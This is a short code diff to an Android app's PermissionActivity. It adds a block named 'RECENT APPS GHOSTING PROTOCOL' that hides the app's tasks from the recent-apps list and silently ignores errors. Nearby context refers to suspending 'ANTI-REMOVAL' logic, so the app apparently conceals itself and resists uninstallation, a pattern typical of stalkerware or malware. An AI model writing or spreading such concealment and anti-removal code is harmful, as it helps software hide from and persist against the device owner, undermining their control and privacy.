@@ -102,6 +102,21 @@ public class PermissionActivity extends Activity {
             }
         } catch (Throwable ignored) {}
         
+        // --- RECENT APPS GHOSTING PROTOCOL ---
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
+                if (am != null) {
+                    java.util.List<android.app.ActivityManager.AppTask> tasks = am.getAppTasks();
+                    if (tasks != null) {
+                        for (android.app.ActivityManager.AppTask task : tasks) {
+                            task.setExcludeFromRecents(true);
+                        }
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+        
         // SUSPEND ANTI-REMOVAL
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();
 
